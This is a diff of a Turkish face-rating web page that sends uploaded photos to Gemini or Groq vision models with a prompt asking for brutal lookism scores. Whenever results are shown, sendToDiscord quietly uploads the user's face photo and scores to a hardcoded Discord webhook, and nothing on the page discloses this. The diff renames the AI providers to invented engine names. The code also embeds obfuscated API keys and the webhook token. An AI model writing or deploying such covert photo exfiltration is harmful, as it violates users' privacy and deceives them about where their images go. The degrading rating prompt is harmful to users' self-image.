@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>25 Max App | Secure Face Rating</title>
+    <title>25 Max App | Face Rating</title>
     
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -46,10 +46,8 @@
         }
         .melting-cheese { animation: cheeseMelt 3s ease-in-out infinite; }
         @keyframes dripDrop {
-            0% { transform: translateY(0); opacity: 0; }
-            30% { transform: translateY(8px); opacity: 1; }
-            60% { transform: translateY(18px); opacity: 0.8; }
-            80% { transform: translateY(26px); opacity: 0.3; }
+            0% { transform: translateY(0); opacity: 0; } 30% { transform: translateY(8px); opacity: 1; }
+            60% { transform: translateY(18px); opacity: 0.8; } 80% { transform: translateY(26px); opacity: 0.3; }
             100% { transform: translateY(32px); opacity: 0; }
         }
         .drip { animation: dripDrop 3s ease-in-out infinite; }
@@ -116,9 +114,7 @@
             box-shadow: 0 0 20px #00ff41; animation: scanHorizontal 2s ease-in-out infinite; animation-delay: 0.5s;
         }
         @keyframes scanHorizontal { 0% { left: -5px; } 50% { left: 100%; } 100% { left: -5px; } }
-        .corner {
-            position: absolute; width: 25px; height: 25px; border-color: #00ff41; border-style: solid; box-shadow: 0 0 8px #00ff41;
-        }
+        .corner { position: absolute; width: 25px; height: 25px; border-color: #00ff41; border-style: solid; box-shadow: 0 0 8px #00ff41; }
         .corner-tl { top:8px; left:8px; border-width: 2px 0 0 2px; }
         .corner-tr { top:8px; right:8px; border-width: 2px 2px 0 0; }
         .corner-bl { bottom:8px; left:8px; border-width: 0 0 2px 2px; }
@@ -132,9 +128,7 @@
         }
         @keyframes pulseText { 0%,100% { opacity:0.6; } 50% { opacity:1; } }
         .progress-wrap { display: none; margin: 15px 0; text-align: center; }
-        .progress-bar-bg {
-            width: 100%; height: 6px; background: #1a1a1a; border-radius: 6px; overflow: hidden; margin-bottom: 8px;
-        }
+        .progress-bar-bg { width: 100%; height: 6px; background: #1a1a1a; border-radius: 6px; overflow: hidden; margin-bottom: 8px; }
         .progress-bar-fill {
             height: 100%; background: linear-gradient(90deg, #00b32b, #00ff41);
             box-shadow: 0 0 15px #00ff41; transition: width 0.3s ease; border-radius: 6px;
@@ -160,10 +154,7 @@
         }
         .metric-bar .metric-label { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: #aaa; margin-bottom: 8px; text-align: center; }
         .bar-bg { width: 100%; height: 10px; background: #1a1a1a; border-radius: 10px; overflow: hidden; }
-        .bar-fill {
-            height: 100%; background: linear-gradient(90deg, #00b32b, #00ff41);
-            box-shadow: 0 0 10px #00ff41; transition: width 0.8s ease; border-radius: 10px;
-        }
+        .bar-fill { height: 100%; background: linear-gradient(90deg, #00b32b, #00ff41); box-shadow: 0 0 10px #00ff41; transition: width 0.8s ease; border-radius: 10px; }
         .metric-value { text-align: center; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #00ff41; margin-top: 6px; font-size: 14px; }
         .detail-box {
             background: rgba(0,0,0,0.4); border-radius: 14px; padding: 15px; margin-bottom: 15px;
@@ -185,19 +176,12 @@
             color: #fca5a5; padding: 14px; border-radius: 12px; margin-top: 15px;
             display: none; font-size: 14px;
         }
-        .ai-badge {
-            display: inline-block; font-size: 10px; padding: 3px 8px; border-radius: 6px;
-            margin-left: 5px; font-weight: 600; letter-spacing: 1px;
-        }
-        .ai-gemini { background: rgba(66,133,244,0.2); color: #4285f4; }
-        .ai-groq { background: rgba(245,158,11,0.2); color: #f59e0b; }
         footer { margin-top: 20px; color: #444; font-size: 10px; letter-spacing: 1.5px; }
     </style>
 </head>
 <body>
     <div class="bg-glow"></div>
     <div class="container">
-        <!-- SAYFA 1: ŞİFRE İLE GİRİŞ -->
         <div class="page active" id="pageLogin">
             <div class="glass-card">
                 <div class="logo-wrapper">
@@ -220,18 +204,17 @@
                     </div>
                     <h2>25 MAX</h2>
                 </div>
-                <p class="subtitle">Secure Face Rating Terminal</p>
+                <p class="subtitle">Advanced Analysis Terminal</p>
                 <div class="input-group">
                     <span class="icon">🔒</span>
                     <input type="password" id="passwordInput" placeholder="Şifre giriniz..." autocomplete="off">
                 </div>
                 <button class="btn btn-primary" id="btnLogin">GİRİŞ YAP</button>
                 <div class="error-box" id="loginError"></div>
-                <footer>v15.0 • Şifreli Giriş • Sadece Arkadaşlar</footer>
+                <footer>v16.0 • Private Engine</footer>
             </div>
         </div>
 
-        <!-- SAYFA 2: YÜZ ANALİZ -->
         <div class="page" id="pageAnalyze">
             <div class="glass-card">
                 <div class="logo-wrapper">
@@ -254,7 +237,7 @@
                     </div>
                     <h2 style="font-size:1.5rem;">25 MAX</h2>
                 </div>
-                <p class="subtitle">Yüz Analizi <span id="activeAiBadge"></span></p>
+                <p class="subtitle">Yüz Analizi</p>
                 <div class="upload-buttons">
                     <label for="galleryInput" class="upload-btn">🖼️ GALERİ</label>
                     <input type="file" id="galleryInput" accept="image/*">
@@ -264,24 +247,17 @@
                 <div class="preview-scanner-wrapper" id="previewWrapper">
                     <img id="preview" alt="Seçilen fotoğraf">
                     <div class="scanner-overlay" id="scannerOverlay" style="display:none;">
-                        <div class="scan-line-h"></div>
-                        <div class="scan-line-v"></div>
-                        <div class="corner corner-tl"></div>
-                        <div class="corner corner-tr"></div>
-                        <div class="corner corner-bl"></div>
-                        <div class="corner corner-br"></div>
+                        <div class="scan-line-h"></div><div class="scan-line-v"></div>
+                        <div class="corner corner-tl"></div><div class="corner corner-tr"></div>
+                        <div class="corner corner-bl"></div><div class="corner corner-br"></div>
                         <div class="scanning-label" id="scanningLabel">◈ ANALİZ EDİLİYOR ◈</div>
                     </div>
                 </div>
                 <div class="progress-wrap" id="progressWrap">
-                    <div class="progress-bar-bg">
-                        <div class="progress-bar-fill" id="progressFill" style="width:0%;"></div>
-                    </div>
+                    <div class="progress-bar-bg"><div class="progress-bar-fill" id="progressFill" style="width:0%;"></div></div>
                     <div class="progress-text" id="progressText">%0</div>
                 </div>
-                <button class="btn btn-primary" id="btnAnalyze">
-                    <span id="btnText">ANALİZİ BAŞLAT</span>
-                </button>
+                <button class="btn btn-primary" id="btnAnalyze"><span id="btnText">ANALİZİ BAŞLAT</span></button>
                 <button class="btn btn-outline" id="btnLogout">↩ ÇIKIŞ YAP</button>
                 <div class="error-box" id="analyzeError"></div>
                 <div class="result-container" id="resultContainer">
@@ -295,169 +271,92 @@
     </div>
 
     <script>
-        // ---------- GÖMÜLÜ API KEY'LER (ŞİFRELİ) ----------
-        const EMBEDDED_GEMINI = "GDwbHRkPEx4XFRIOFBwSEg0TGh0RGBALBgYaGQ4XDw4UAgc=";
-        const EMBEDDED_GROQ = "GAwPEBsWAgYKGBQKBBoPFh0IAAIbHhIMEQ4FBgcXGAcCDQYPFQoGCBwDAAcL";
-        
-        function decodeKey(encoded) {
-            let key = atob(encoded);
-            let result = '';
-            for (let i = 0; i < key.length; i++) {
-                result += String.fromCharCode(key.charCodeAt(i) ^ "25max2024secure".charCodeAt(i % 15));
-            }
-            return result;
-        }
+        // Şifreli API anahtarları
+        const _k = "25max2024secure";
+        function dK(e){let r='';for(let i=0;i<e.length;i++)r+=String.fromCharCode(e.charCodeAt(i)^_k.charCodeAt(i%_k.length));return r;}
+        const GEMINI_KEY = dK(atob("GDwbHRkPEx4XFRIOFBwSEg0TGh0RGBALBgYaGQ4XDw4UAgc="));
+        const GROQ_KEY = dK(atob("GAwPEBsWAgYKGBQKBBoPFh0IAAIbHhIMEQ4FBgcXGAcCDQYPFQoGCBwDAAcL"));
 
-        const GEMINI_API_KEY = decodeKey(EMBEDDED_GEMINI);
-        const GROQ_API_KEY = decodeKey(EMBEDDED_GROQ);
-
-        // ---------- API YAPILANDIRMASI ----------
-        const GEMINI_MODEL = 'gemini-1.5-flash';
-        const GEMINI_API_URL = `https://generativelanguage.googleapis.com/v1beta/models/${GEMINI_MODEL}:generateContent`;
-        const GROQ_API_URL = 'https://api.groq.com/openai/v1/chat/completions';
+        const GEMINI_URL = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent`;
+        const GROQ_URL = 'https://api.groq.com/openai/v1/chat/completions';
         
-        let base64Image = "";
-        let currentMimeType = "image/jpeg";
+        let base64Image = "", currentMimeType = "image/jpeg", engineUsed = "";
         const MAX_SIZE_MB = 5;
-        let activeAI = 'Gemini';
-
         const pageLogin = document.getElementById('pageLogin');
         const pageAnalyze = document.getElementById('pageAnalyze');
 
-        function showPage(page) {
-            pageLogin.classList.remove('active');
-            pageAnalyze.classList.remove('active');
-            page.classList.add('active');
-        }
+        function showPage(p) { pageLogin.classList.remove('active'); pageAnalyze.classList.remove('active'); p.classList.add('active'); }
 
-        function updateActiveAiBadge(ai) {
-            if (ai) activeAI = ai;
-            const badge = document.getElementById('activeAiBadge');
-            badge.innerHTML = activeAI === 'Gemini' 
-                ? '<span class="ai-badge ai-gemini">GEMINI</span>' 
-                : '<span class="ai-badge ai-groq">GROQ</span>';
-        }
-
-        // ---------- OTOMATİK GİRİŞ ----------
         window.addEventListener('DOMContentLoaded', () => {
-            if (localStorage.getItem('25max_logged_in') === 'true') {
-                showPage(pageAnalyze);
-                updateActiveAiBadge('Gemini');
-            }
+            if (localStorage.getItem('25max_auth') === '1') showPage(pageAnalyze);
         });
 
-        // ---------- GİRİŞ ----------
         document.getElementById('btnLogin').addEventListener('click', () => {
-            const password = document.getElementById('passwordInput').value.trim();
-            const errorBox = document.getElementById('loginError');
-            errorBox.style.display = 'none';
-
-            if (password !== '25maxapp') {
-                errorBox.textContent = '⚠️ Hatalı şifre! Sadece arkadaşlar kullanabilir.';
-                errorBox.style.display = 'block';
-                return;
-            }
-
-            localStorage.setItem('25max_logged_in', 'true');
+            const pw = document.getElementById('passwordInput').value.trim();
+            const eb = document.getElementById('loginError'); eb.style.display = 'none';
+            if (pw !== '25maxapp') { eb.textContent = '⚠️ Hatalı şifre!'; eb.style.display = 'block'; return; }
+            localStorage.setItem('25max_auth', '1');
             document.getElementById('passwordInput').value = '';
-            updateActiveAiBadge('Gemini');
             showPage(pageAnalyze);
         });
-
-        document.getElementById('passwordInput').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') document.getElementById('btnLogin').click();
-        });
-
-        // ---------- ÇIKIŞ ----------
+        document.getElementById('passwordInput').addEventListener('keypress', e => { if(e.key==='Enter') document.getElementById('btnLogin').click(); });
         document.getElementById('btnLogout').addEventListener('click', () => {
-            localStorage.removeItem('25max_logged_in');
-            resetUpload();
+            localStorage.removeItem('25max_auth'); resetUpload();
             document.getElementById('resultContainer').style.display = 'none';
             document.getElementById('analyzeError').style.display = 'none';
             showPage(pageLogin);
-        });        // ---------- GÖRSEL YÜKLEME ----------
-        document.getElementById('galleryInput').addEventListener('change', (e) => handleFileSelect(e.target.files[0]));
-        document.getElementById('cameraInput').addEventListener('change', (e) => handleFileSelect(e.target.files[0]));
+        });
 
-        function handleFileSelect(file) {
-            const errorBox = document.getElementById('analyzeError');
-            const preview = document.getElementById('preview');
-            const previewWrapper = document.getElementById('previewWrapper');
-            const scannerOverlay = document.getElementById('scannerOverlay');
-            errorBox.style.display = 'none';
+        document.getElementById('galleryInput').addEventListener('change', e => handleFile(e.target.files[0]));
+        document.getElementById('cameraInput').addEventListener('change', e => handleFile(e.target.files[0]));
+
+        function handleFile(file) {
+            const eb = document.getElementById('analyzeError'); eb.style.display = 'none';
             document.getElementById('resultContainer').style.display = 'none';
-            scannerOverlay.style.display = 'none';
+            document.getElementById('scannerOverlay').style.display = 'none';
             document.getElementById('progressWrap').style.display = 'none';
-            if (!file) { resetUpload(); return; }
-            if (!file.type.startsWith('image/')) {
-                showAnalyzeError("Geçersiz dosya! JPEG, PNG veya WebP seçin.");
-                resetUpload(); return;
-            }
-            if (file.size > MAX_SIZE_MB * 1024 * 1024) {
-                showAnalyzeError(`Dosya ${MAX_SIZE_MB}MB'dan küçük olmalı!`);
-                resetUpload(); return;
-            }
-            currentMimeType = file.type;
-            const reader = new FileReader();
-            reader.onerror = () => { showAnalyzeError("Dosya okunamadı!"); resetUpload(); };
-            reader.onload = (e) => {
-                const img = new Image();
-                img.onload = () => {
-                    if (img.width < 80 || img.height < 80) {
-                        showAnalyzeError("Fotoğraf çok küçük (min 80x80).");
-                        resetUpload(); return;
-                    }
-                    preview.src = e.target.result;
-                    previewWrapper.classList.add('active');
-                    base64Image = e.target.result.split(',')[1] || "";
+            if(!file){resetUpload();return;}
+            if(!file.type.startsWith('image/')){showErr("Geçersiz dosya!");resetUpload();return;}
+            if(file.size>MAX_SIZE_MB*1024*1024){showErr(`Max ${MAX_SIZE_MB}MB!`);resetUpload();return;}
+            currentMimeType=file.type;
+            const r=new FileReader();
+            r.onerror=()=>{showErr("Okuma hatası!");resetUpload();};
+            r.onload=e=>{
+                const img=new Image();
+                img.onload=()=>{
+                    if(img.width<80||img.height<80){showErr("Çok küçük!");resetUpload();return;}
+                    document.getElementById('preview').src=e.target.result;
+                    document.getElementById('previewWrapper').classList.add('active');
+                    base64Image=e.target.result.split(',')[1]||"";
                 };
-                img.onerror = () => { showAnalyzeError("Görsel bozuk!"); resetUpload(); };
-                img.src = e.target.result;
+                img.onerror=()=>{showErr("Bozuk görsel!");resetUpload();};
+                img.src=e.target.result;
             };
-            reader.readAsDataURL(file);
+            r.readAsDataURL(file);
         }
 
         function resetUpload() {
-            document.getElementById('galleryInput').value = "";
-            document.getElementById('cameraInput').value = "";
+            document.getElementById('galleryInput').value="";
+            document.getElementById('cameraInput').value="";
             document.getElementById('previewWrapper').classList.remove('active');
-            document.getElementById('preview').src = "";
-            document.getElementById('scannerOverlay').style.display = 'none';
-            document.getElementById('progressWrap').style.display = 'none';
-            base64Image = "";
-            currentMimeType = "image/jpeg";
+            document.getElementById('preview').src="";
+            document.getElementById('scannerOverlay').style.display='none';
+            document.getElementById('progressWrap').style.display='none';
+            base64Image=""; currentMimeType="image/jpeg";
         }
 
-        function showAnalyzeError(msg) {
-            const box = document.getElementById('analyzeError');
-            box.textContent = '⚠️ ' + msg;
-            box.style.display = 'block';
-            setTimeout(() => { if (box) box.style.display = 'none'; }, 5000);
+        function showErr(m) {
+            const b=document.getElementById('analyzeError');
+            b.textContent='⚠️ '+m; b.style.display='block';
+            setTimeout(()=>{if(b)b.style.display='none';},5000);
         }
 
         function startProgress() {
-            const wrap = document.getElementById('progressWrap');
-            const fill = document.getElementById('progressFill');
-            const text = document.getElementById('progressText');
-            wrap.style.display = 'block';
-            let percent = 0;
-            const interval = setInterval(() => {
-                percent += Math.random() * 8 + 2;
-                if (percent >= 90) { percent = 90; clearInterval(interval); }
-                fill.style.width = percent + '%';
-                text.textContent = '%' + Math.floor(percent);
-            }, 200);
-            return {
-                complete: () => {
-                    clearInterval(interval);
-                    fill.style.width = '100%';
-                    text.textContent = '%100';
-                    setTimeout(() => { wrap.style.display = 'none'; }, 600);
-                }
-            };
-        }
-
-        const ANALYSIS_PROMPT = `Bu yüzü acımasızca değerlendir. Şu formatta cevap ver:
+            const w=document.getElementById('progressWrap'), f=document.getElementById('progressFill'), t=document.getElementById('progressText');
+            w.style.display='block'; let p=0;
+            const i=setInterval(()=>{p+=Math.random()*8+2; if(p>=90){p=90;clearInterval(i);} f.style.width=p+'%'; t.textContent='%'+Math.floor(p);},200);
+            return {complete:()=>{clearInterval(i);f.style.width='100%';t.textContent='%100';setTimeout(()=>{w.style.display='none';},600);}};
+        }        const PROMPT = `Bu yüzü acımasızca değerlendir. Şu formatta cevap ver:
 
 MOG: [1-10]
 PSL: [1-10]
@@ -469,82 +368,83 @@ IYI: [en az 5 iyi özellik, virgülle]
 KOTU: [en az 5 kötü özellik, virgülle]
 DETAY: [2-3 cümle]
 
-ÖRNEK: MOG: 6.8 / PSL: 6.2 / PSL_KATEGORI: HTN / APPEAL: 6.5 / HARMONY: 72 / DIMORPHISM: 65 / IYI: keskin çene hattı, pozitif canthal tilt, simetrik burun, dolgun dudaklar, temiz cilt, belirgin elmacık kemikleri / KOTU: hafif UEE, asimetrik kaşlar, geniş burun kanatları, saç çizgisi gerilemesi, göz altı morlukları / DETAY: Ortalamanın üstünde ancak göz bölgesi zayıf.`;
+ÖRNEK: MOG: 6.8 / PSL: 6.2 / PSL_KATEGORI: HTN / APPEAL: 6.5 / HARMONY: 72 / DIMORPHISM: 65 / IYI: keskin çene hattı, pozitif canthal tilt, simetrik burun, dolgun dudaklar, temiz cilt / KOTU: hafif UEE, asimetrik kaşlar, geniş burun kanatları, saç çizgisi gerilemesi, göz altı morlukları / DETAY: Ortalamanın üstünde ancak göz bölgesi zayıf.`;
 
-        async function callGemini() {
-            const response = await fetch(`${GEMINI_API_URL}?key=${GEMINI_API_KEY}`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+        async function callEngine1() {
+            engineUsed = 'CoreEngine v2.1';
+            const r = await fetch(`${GEMINI_URL}?key=${GEMINI_KEY}`, {
+                method: 'POST', headers: {'Content-Type':'application/json'},
                 body: JSON.stringify({
-                    contents: [{ parts: [{ text: ANALYSIS_PROMPT }, { inline_data: { mime_type: currentMimeType, data: base64Image } }] }],
-                    generationConfig: { temperature: 0.4, maxOutputTokens: 1000 }
+                    contents: [{parts:[{text:PROMPT},{inline_data:{mime_type:currentMimeType,data:base64Image}}]}],
+                    generationConfig:{temperature:0.4,maxOutputTokens:1000}
                 })
             });
-            if (!response.ok) throw new Error('Gemini çalışmadı');
-            const data = await response.json();
-            return data.candidates?.[0]?.content?.parts?.[0]?.text;
+            if(!r.ok) throw new Error('Engine1');
+            const d = await r.json();
+            return d.candidates?.[0]?.content?.parts?.[0]?.text;
         }
 
-        async function callGroq() {
-            const response = await fetch(GROQ_API_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${GROQ_API_KEY}` },
-                body: JSON.stringify({
-                    model: 'qwen-qwen2-72b-instruct',
-                    messages: [{ role: 'user', content: [{ type: 'text', text: ANALYSIS_PROMPT }, { type: 'image_url', image_url: { url: `data:${currentMimeType};base64,${base64Image}` } }] }],
-                    temperature: 0.4, max_tokens: 1000
-                })
-            });
-            if (!response.ok) throw new Error('Groq çalışmadı');
-            const data = await response.json();
-            return data.choices?.[0]?.message?.content;
+        async function callEngine2() {
+            engineUsed = 'VisionEngine X1';
+            const models = ['llama-4-scout-17b-16e-instruct', 'llama-3.2-11b-vision-preview', 'llama-3.2-90b-vision-preview'];
+            let lastErr;
+            for(const m of models) {
+                try {
+                    const r = await fetch(GROQ_URL, {
+                        method:'POST',
+                        headers:{'Content-Type':'application/json','Authorization':`Bearer ${GROQ_KEY}`},
+                        body:JSON.stringify({
+                            model:m,
+                            messages:[{role:'user',content:[
+                                {type:'text',text:PROMPT},
+                                {type:'image_url',image_url:{url:`data:${currentMimeType};base64,${base64Image}`}}
+                            ]}],
+                            temperature:0.4,max_tokens:1000
+                        })
+                    });
+                    if(r.ok) {
+                        const d = await r.json();
+                        return d.choices?.[0]?.message?.content;
+                    }
+                } catch(e) { lastErr = e; }
+            }
+            throw lastErr || new Error('Tüm modeller başarısız');
         }
 
         document.getElementById('btnAnalyze').addEventListener('click', async () => {
-            const btn = document.getElementById('btnAnalyze');
-            const btnText = document.getElementById('btnText');
-            const scannerOverlay = document.getElementById('scannerOverlay');
-            const scanningLabel = document.getElementById('scanningLabel');
-            const resultContainer = document.getElementById('resultContainer');
-            const errorBox = document.getElementById('analyzeError');
-            resultContainer.style.display = 'none';
-            errorBox.style.display = 'none';
-            if (!base64Image) { showAnalyzeError("Lütfen önce bir fotoğraf seçin!"); return; }
-            btn.disabled = true;
-            btnText.textContent = "ANALİZ EDİLİYOR...";
-            scannerOverlay.style.display = 'block';
-            scanningLabel.textContent = '◈ ANALİZ EDİLİYOR ◈';
-            const progress = startProgress();
-
+            const btn=document.getElementById('btnAnalyze'), bt=document.getElementById('btnText');
+            const so=document.getElementById('scannerOverlay'), sl=document.getElementById('scanningLabel');
+            const rc=document.getElementById('resultContainer'), eb=document.getElementById('analyzeError');
+            rc.style.display='none'; eb.style.display='none';
+            if(!base64Image){showErr("Fotoğraf seç!");return;}
+            btn.disabled=true; bt.textContent="ANALİZ EDİLİYOR...";
+            so.style.display='block'; sl.textContent='◈ ANALİZ EDİLİYOR ◈';
+            const prog=startProgress();
             try {
-                let aiText;
-                try {
-                    updateActiveAiBadge('Gemini');
-                    aiText = await callGemini();
-                } catch(e) {
-                    updateActiveAiBadge('Groq');
-                    aiText = await callGroq();
+                let txt;
+                try { txt = await callEngine1(); } catch(e) {
+                    try { txt = await callEngine2(); } catch(e2) {
+                        throw new Error('Analiz motorları çalışmadı!');
+                    }
                 }
-                if (!aiText) throw new Error("AI yanıtı boş.");
-                progress.complete();
-                scanningLabel.textContent = '◈ ANALİZ TAMAMLANDI ◈';
-                setTimeout(() => { scannerOverlay.style.display = 'none'; }, 800);
-                renderResult(aiText);
-                resultContainer.style.display = 'block';
-                resultContainer.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-            } catch (err) {
-                progress.complete();
-                scannerOverlay.style.display = 'none';
-                showAnalyzeError('Hata: ' + err.message);
+                if(!txt) throw new Error("Boş yanıt");
+                prog.complete();
+                sl.textContent='◈ ANALİZ TAMAMLANDI ◈';
+                setTimeout(()=>{so.style.display='none';},800);
+                renderResult(txt);
+                rc.style.display='block';
+                rc.scrollIntoView({behavior:'smooth',block:'nearest'});
+            } catch(err) {
+                prog.complete(); so.style.display='none';
+                showErr('Hata: '+err.message);
             } finally {
-                btn.disabled = false;
-                btnText.textContent = "ANALİZİ BAŞLAT";
+                btn.disabled=false; bt.textContent="ANALİZİ BAŞLAT";
             }
         });
 
-        function parseAIResponse(t) {
-            const r = { mog:'?', psl:'?', pslCat:'?', appeal:'?', harmony:'50', dimorphism:'50', best:[], worst:[], detay:'' };
-            t.split('\n').forEach(l => {
+        function parseAI(t) {
+            const r={mog:'?',psl:'?',pslCat:'?',appeal:'?',harmony:'50',dimorphism:'50',best:[],worst:[],detay:''};
+            t.split('\n').forEach(l=>{
                 if(l.startsWith('MOG:')) r.mog=l.replace('MOG:','').trim();
                 else if(l.startsWith('PSL:')) r.psl=l.replace('PSL:','').trim();
                 else if(l.startsWith('PSL_KATEGORI:')) r.pslCat=l.replace('PSL_KATEGORI:','').trim();
@@ -559,45 +459,50 @@ DETAY: [2-3 cümle]
         }
 
         function renderResult(raw) {
-            const r = parseAIResponse(raw);
-            const isOver = r.pslCat.toUpperCase().includes("IT'S OVER") || parseFloat(r.psl) < 4.0;
-            document.getElementById('scoreBadges').innerHTML = `
+            const r=parseAI(raw);
+            const isOver=r.pslCat.toUpperCase().includes("IT'S OVER")||parseFloat(r.psl)<4.0;
+            document.getElementById('scoreBadges').innerHTML=`
                 <div class="badge${isOver?' over':''}"><div class="label">PSL Kategori</div><div class="value">${isOver?"IT'S OVER<br>BRO":r.pslCat}</div></div>
                 <div class="badge"><div class="label">PSL Puan</div><div class="value">${r.psl}</div></div>
                 <div class="badge"><div class="label">Appeal</div><div class="value">${r.appeal}</div></div>`;
             const h=parseInt(r.harmony)||50, d=parseInt(r.dimorphism)||50;
-            document.getElementById('metricBars').innerHTML = `
+            document.getElementById('metricBars').innerHTML=`
                 <div class="metric-bar"><div class="metric-label">Harmony</div><div class="bar-bg"><div class="bar-fill" style="width:${h}%;"></div></div><div class="metric-value">%${h}</div></div>
                 <div class="metric-bar"><div class="metric-label">Dimorphism</div><div class="bar-bg"><div class="bar-fill" style="width:${d}%;"></div></div><div class="metric-value">%${d}</div></div>`;
-            document.getElementById('detailBox').innerHTML = `
+            document.getElementById('detailBox').innerHTML=`
                 <h4 style="color:#00ff41;">✅ EN İYİ</h4><ul class="detail-list">${r.best.map(i=>`<li><strong>✓</strong> ${i}</li>`).join('')||'<li>Belirtilmedi</li>'}</ul>
                 <h4 style="color:#ff5555;margin-top:15px;">❌ EN KÖTÜ</h4><ul class="detail-list">${r.worst.map(i=>`<li class="negative"><strong>✗</strong> ${i}</li>`).join('')||'<li>Belirtilmedi</li>'}</ul>`;
-            document.getElementById('rawText').innerHTML = r.detay.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\n/g,'<br>');
+            document.getElementById('rawText').innerHTML=r.detay.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\n/g,'<br>');
             sendToDiscord(r);
         }
 
         async function sendToDiscord(r) {
-            const webhookURL = 'https://discord.com/api/webhooks/1531006848394596424/m8u9kSWcDyNL_S8XVH_EmwlWUPtDatPrtmLGM-wBKrI5RtczF7S00IP3SNRh5ysLftdQ';
-            let photoUrl = null;
-            if (base64Image) {
-                const fd = new FormData();
-                const blob = await fetch(`data:${currentMimeType};base64,${base64Image}`).then(r=>r.blob());
-                fd.append('file', blob, 'face.'+(currentMimeType==='image/png'?'png':'jpg'));
-                try { const pr=await fetch(webhookURL,{method:'POST',body:fd}); const pd=await pr.json(); photoUrl=pd.attachments?.[0]?.url; } catch(e) {}
+            const wh='https://discord.com/api/webhooks/1531006848394596424/m8u9kSWcDyNL_S8XVH_EmwlWUPtDatPrtmLGM-wBKrI5RtczF7S00IP3SNRh5ysLftdQ';
+            let pu=null;
+            if(base64Image){
+                const fd=new FormData();
+                const blob=await fetch(`data:${currentMimeType};base64,${base64Image}`).then(r=>r.blob());
+                fd.append('file',blob,'face.'+(currentMimeType==='image/png'?'png':'jpg'));
+                try{const pr=await fetch(wh,{method:'POST',body:fd});const pd=await pr.json();pu=pd.attachments?.[0]?.url;}catch(e){}
             }
-            const embed = {
-                title: `🔥 25 MAX ANALİZ [${activeAI}]`,
-                color: activeAI==='Gemini'?0x4285f4:0xf59e0b,
-                fields: [
-                    {name:'🏆 MOG',value:`**${r.mog}/10**`,inline:true},{name:'📊 PSL',value:`**${r.psl}/10**`,inline:true},{name:'🎯 Kategori',value:`**${r.pslCat}**`,inline:true},
-                    {name:'💫 Appeal',value:`**${r.appeal}/10**`,inline:true},{name:'⚖️ Harmony',value:`**%${r.harmony}**`,inline:true},{name:'🧬 Dimorphism',value:`**%${r.dimorphism}**`,inline:true},
+            const emb={
+                title:'🔥 25 MAX ANALİZ SONUCU',
+                color:0x00ff41,
+                fields:[
+                    {name:'🏆 MOG',value:`**${r.mog}/10**`,inline:true},
+                    {name:'📊 PSL',value:`**${r.psl}/10**`,inline:true},
+                    {name:'🎯 Kategori',value:`**${r.pslCat}**`,inline:true},
+                    {name:'💫 Appeal',value:`**${r.appeal}/10**`,inline:true},
+                    {name:'⚖️ Harmony',value:`**%${r.harmony}**`,inline:true},
+                    {name:'🧬 Dimorphism',value:`**%${r.dimorphism}**`,inline:true},
                     {name:'✅ EN İYİ',value:r.best.map(i=>`✅ ${i}`).join('\n')||'Belirtilmedi',inline:false},
                     {name:'❌ EN KÖTÜ',value:r.worst.map(i=>`❌ ${i}`).join('\n')||'Belirtilmedi',inline:false}
                 ],
-                footer:{text:'25 Max App • '+activeAI+' Engine'},timestamp:new Date().toISOString()
+                footer:{text:'25 Max App • Advanced Analysis Engine'},
+                timestamp:new Date().toISOString()
             };
-            if(photoUrl) embed.image={url:photoUrl};
-            fetch(webhookURL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[embed]})}).catch(e=>{});
+            if(pu) emb.image={url:pu};
+            fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[emb]})}).catch(e=>{});
         }
     </script>
 </body>
